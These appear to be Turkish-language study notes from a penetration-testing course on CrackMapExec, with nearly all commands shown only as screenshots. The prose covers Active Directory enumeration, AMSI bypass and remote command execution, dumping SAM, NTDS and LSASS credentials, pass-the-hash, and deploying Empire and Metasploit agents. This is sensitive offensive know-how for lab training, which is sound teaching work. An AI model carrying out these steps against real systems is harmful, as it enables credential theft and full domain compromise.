+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+
+
+### İlginç Hesap Özelliklerini Numaralandırma
+
+ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+
+PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
+
+
+### PASSWD_NOTREQD Özniteliğinin Tanımlanması
+
+![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
+![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
+
+TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Kısıtlamasız Delegasyonun Belirlenmesi
+![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
+
+adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+
+
+### adminCount Özniteliğini Sorgulama
+![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
+![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
+![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+
+
+### Domain SID'sini numaralandırma
+
+Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+
+
+### Gathering the Domain SID
+
+![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
+![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+
+
+### Group Managed Service Accounts (gMSA)
+
+Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:
+
+* Otomatik parola yönetimi.
+* Basitleştirilmiş service principal name (SPN) yönetimi.
+* Yönetimi diğer yöneticilere devretme yeteneği
+
+Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+
+Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
+
+Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
+
+
+### Enumerating Accounts with gMSA Privileges
+![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
+![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
+
+Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+
+
+### gMSA Parolasını Edinme
+![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
+
+
+### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
+![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
+![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
+
+
+### RDP Screenshots
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+
+### Enumerate Login Prompt
+![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
+
+Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
+
+
+
+### Taking a Screenshot
+![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
+![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+
+
+Not: --screentime ve --res isteğe bağlı bayraklardır.
+
+Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
+
+
+### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
+![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
+
+
+Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
+
+
+
+
+
+### Command Execution
+
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+
+![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+
+Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+
+Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+
+
+
+### Command Execution as Administrator
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+
+
+### Bir Komutu Administrator Olarak Çalıştırma
+![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
+![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+
+### RID 500 Dışı Hesap Olarak Komut Yürütme
+Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+
+### Komutu localadmin olarak çalıştırma
+![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+
+
+### LocalAccountTokenFilterPolicy'yi Değiştirme
+![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
+
+![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+
+
+### Domain Hesabı Olarak Komut Yürütme
+LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+
+### Komutu Robert olarak çalıştır
+![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+
+### SMB ile Komut Yürütme
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
+
+Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+
+Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
+
+![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+
+
+### SMBExec Yöntemi ile Komut Yürütme
+![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
+
+
+### wmiexec aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
+![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
+
+12. AMSI baypas
+13. Payload'u gizleyin
+14. Payload'u çalıştırın
+
+### Özel AMSI Bypass Çalıştırma
+
+Bu teknikler PowerShell çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, --amsi-bypass seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:
+
+15. “Değiştirilmiş Amsi ScanBuffer Yaması” içeren dosyayı indirin
+
+
+### “Değiştirilmiş Amsi ScanBuffer Yaması” ile Bir Dosya Oluşturun
+![Pasted image 20241203101828.png](/img/user/resimler/Pasted%20image%2020241203101828.png)
+Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır
+
+### Komut Maksimum Uzunluğu Aşıyor
+![Pasted image 20241203102011.png](/img/user/resimler/Pasted%20image%2020241203102011.png)
+![Pasted image 20241203102018.png](/img/user/resimler/Pasted%20image%2020241203102018.png)
+
+16. Bu sorunu çözmek için, shantanukhande-amsi.ps1 dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.
+
+### PowerShell Komut Dosyasını Oluşturma ve Barındırma
+![Pasted image 20241203102127.png](/img/user/resimler/Pasted%20image%2020241203102127.png)
+
+Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.
+
+Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:
+
+
+### PowerShell Özel AMSI Bypass Kullanma
+![Pasted image 20241203102312.png](/img/user/resimler/Pasted%20image%2020241203102312.png)
+![Pasted image 20241203102346.png](/img/user/resimler/Pasted%20image%2020241203102346.png)
+
+
+### WinRM Kullanarak Komut Yürütme
+WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port 5985 ve HTTPS TCP port 5986'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için yönetici olmasını gerektirmemesidir. Administrators grubunun üyesiysek, Remote Management Users grubunun üyesiysek veya oturum yapılandırmasında açık PowerShell Remoting izinlerimiz varsa WinRM protokolünü kullanabiliriz.
+
+
+### Command Execution using WinRM
+![Pasted image 20241203102455.png](/img/user/resimler/Pasted%20image%2020241203102455.png)
+![Pasted image 20241203102501.png](/img/user/resimler/Pasted%20image%2020241203102501.png)
+
+
+
+### WinRM aracılığıyla PowerShell Komut Yürütme
+![Pasted image 20241203102608.png](/img/user/resimler/Pasted%20image%2020241203102608.png)
+
+
+### Other PowerShell Options
+
+WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:
+
+![Pasted image 20241203102901.png](/img/user/resimler/Pasted%20image%2020241203102901.png)
+
+Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.
+
+
+### SSH Command Execution
+CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.
+
+### Command Execution with SSH
+![Pasted image 20241203103019.png](/img/user/resimler/Pasted%20image%2020241203103019.png)
+![Pasted image 20241203103028.png](/img/user/resimler/Pasted%20image%2020241203103028.png)
+![Pasted image 20241203103033.png](/img/user/resimler/Pasted%20image%2020241203103033.png)
+
+Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da public ve private anahtarları kullanmaktır. CrackMapExec, --key-file seçeneği ile private key kullanımını destekler. Anahtarın çalışması için OPENSSH formatında olması gerekir.
+
+
+### Private Key Kullanarak SSH ile Komut Yürütme
+![Pasted image 20241203103449.png](/img/user/resimler/Pasted%20image%2020241203103449.png)
+
+Not: Herhangi bir parola yapılandırılmamışsa, -p seçeneğini boş (“”) olarak ayarlamalıyız, aksi takdirde bir hata alırız
+
+Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
+
+
+### Gizli Bilgileri Bulma ve Kullanma
+Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+
+
+### SAM
+SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
+
+
+### Dumping SAM
+![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
+![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+
+### NTDS Active Directory Database
+
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+
+https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+
+Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+
+Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+
+
+### Domain Controller'dan NTDS veritabanını boşaltma
+![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
+![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
+![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
+![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
+![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
+![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+
+--ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+
+
+### Yalnızca KRBTGT Hesabının Boşaltılması
+![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
+
+Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+
+
+### Yalnızca Enabled Hesapları Gösterme
+![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
+![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
+![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
+![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+
+### Using the Secrets (hashes)
+
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
+
+
+### Using NTLM Hashes
+![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
+
+
+### LSA Secrets/Cached Credentials
+
+CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+
+LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+
+
+
+### LSA'yı inceleyin
+
+![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
+![Pasted image 20241203105942.png](/img/user/resimler/Pasted%20image%2020241203105942.png)
+
+DCC2$ ile başlayan hash formatı Domain Cached Credentials 2 (DCC2), MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse Hashcat kullanılarak kırılabilir çünkü bu algoritma NTLM'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri Pas the Hash saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, $DCC2$ 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.
+
+
+### Cracking Hashes
+![Pasted image 20241203110157.png](/img/user/resimler/Pasted%20image%2020241203110157.png)
+
+
+![Pasted image 20241203110211.png](/img/user/resimler/Pasted%20image%2020241203110211.png)
+![Pasted image 20241203110216.png](/img/user/resimler/Pasted%20image%2020241203110216.png)
+
+
+
+### LSASS'tan Gettings Secrets
+LSASS prosesinin belleği, Windows parolalarını açık metin olarak veya NTLM veya AES256/AES128 gibi diğer hash biçimlerini içerir. Belleği boşaltmak, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.
+
+CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:
+
+17. [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dökümündeki gerekli baytları uzaktan okumak için Impacket projesini ve kimlik bilgilerini çıkarmak için pypykatz kullanır.
+
+
+### Lsassy Module
+
+![Pasted image 20241203113833.png](/img/user/resimler/Pasted%20image%2020241203113833.png)
+
+18. Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft Procdump'ı ve kimlik bilgilerini çıkarmak için pypykatz'ı kullanır.
+
+
+### Procdump Module
+![Pasted image 20241203114045.png](/img/user/resimler/Pasted%20image%2020241203114045.png)
+![Pasted image 20241203114101.png](/img/user/resimler/Pasted%20image%2020241203114101.png)
+
+19. HandleKatz bu araç, LSASS'a klonlanmış handle'ların kullanımını göstererek aynı şekilde gizlenmiş bir bellek dökümü oluşturur
+
+
+### Handlekatz Module
+
+![Pasted image 20241203114136.png](/img/user/resimler/Pasted%20image%2020241203114136.png)
+![Pasted image 20241203114143.png](/img/user/resimler/Pasted%20image%2020241203114143.png)
+![Pasted image 20241203114156.png](/img/user/resimler/Pasted%20image%2020241203114156.png)
+
+
+20. Nanodump, LSASS prosesinin bir minidump'ını oluşturan esnek bir araçtır. LSASS'a bir handle açılması tespit edilebildiğinden, Nanodump LSASS'a mevcut handle'ları arayabilir. Bir tane bulunursa, onu kopyalayacak ve minidump oluşturmak için kullanacaktır. Böyle bir handle bulmanın garanti olmadığını unutmayın.
+
+
+### Nanodump Module
+
+![Pasted image 20241203114243.png](/img/user/resimler/Pasted%20image%2020241203114243.png)
+![Pasted image 20241203114252.png](/img/user/resimler/Pasted%20image%2020241203114252.png)
+![Pasted image 20241203114300.png](/img/user/resimler/Pasted%20image%2020241203114300.png)
+
+Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.
+
+
+### C2 Framework'te Oturumlar Alma
+CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla keşif yapmak veya Empire veya Metasploit gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir agent almak için CrackMapExec'i kullanabiliriz.
+
+Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.
+
+
+### Empire
+
+Web sitelerinde sağlanan kılavuzu kullanarak Empire framework'ü yükleyerek başlayacağız
+
+
+### Empire Server'ı Kurun ve Başlatın
+
+![Pasted image 20241203120126.png](/img/user/resimler/Pasted%20image%2020241203120126.png)
+
+Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz empireadmin kullanıcı adını ve HackTheBoxCME şifresini kullanacağız! .
+
+
+### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma
+![Pasted image 20241203120243.png](/img/user/resimler/Pasted%20image%2020241203120243.png)
+
+Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.
+
+CrackMapExec yapılandırma dosyası varsayılan olarak ~/.cme/cme.conf adresinde bulunur. [Empire] seçeneğini empireadmin kullanıcı adı ve HackTheBoxCME şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server 1337 portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.
+
+
+### CrackMapExec Configuration File
+
+![Pasted image 20241203120720.png](/img/user/resimler/Pasted%20image%2020241203120720.png)
+![Pasted image 20241203120727.png](/img/user/resimler/Pasted%20image%2020241203120727.png)
+
+Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya empire/client/config.yaml adresinde bulunur:
+
+
+### İnceleme
+
+![Pasted image 20241203120800.png](/img/user/resimler/Pasted%20image%2020241203120800.png)
+![Pasted image 20241203120806.png](/img/user/resimler/Pasted%20image%2020241203120806.png)
+
+Yapılandırma dosyaları değiştirildikten sonra, Empire istemcisi ile Empire sunucusuna bağlanmalıyız
+
+
+### Empire Client Connection
+
+![Pasted image 20241203120835.png](/img/user/resimler/Pasted%20image%2020241203120835.png)
+![Pasted image 20241203120840.png](/img/user/resimler/Pasted%20image%2020241203120840.png)
+![Pasted image 20241203120846.png](/img/user/resimler/Pasted%20image%2020241203120846.png)
+
+Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.
+
+
+### Empire Setting up IP and Port
+![Pasted image 20241203120914.png](/img/user/resimler/Pasted%20image%2020241203120914.png)
+
+Artık dinleyicimiz çalışıyor ve empire_exec modülü ile Empire'a bir agent almak için CrackMapExec'i kullanabiliriz. Ayarladığımız dinleyici olan LISTENER=http seçeneğini eklememiz gerekiyor.
+
+
+### CrackMapExec Modülünü Kullanma empire_exec
+
+![Pasted image 20241203121001.png](/img/user/resimler/Pasted%20image%2020241203121001.png)
+
+Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.
+
+![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)
+
+
+### Metasploit
+
+Aynı şeyi CrackMapExec modülü web_delivery kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te web_delivery modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve web_delivery işleyicisini yapılandıralım
+
+
+### Metasploit Configure web_delivery Handler
+
+![Pasted image 20241203121139.png](/img/user/resimler/Pasted%20image%2020241203121139.png)
+![Pasted image 20241203121202.png](/img/user/resimler/Pasted%20image%2020241203121202.png)
+
+Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. URL ve PAYLOAD olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer x64 kullanıyorsak, x64 varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da PAYLOAD=64 kullanabiliriz. Eğer 32 bit payload kullanıyorsak PAYLOAD=32 seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:
+
+
+### CrackMapExec web_delivery Module
+
+![Pasted image 20241203121251.png](/img/user/resimler/Pasted%20image%2020241203121251.png)
+![Pasted image 20241203121301.png](/img/user/resimler/Pasted%20image%2020241203121301.png)
+
+
+![Pasted image 20241203121307.png](/img/user/resimler/Pasted%20image%2020241203121307.png)
+
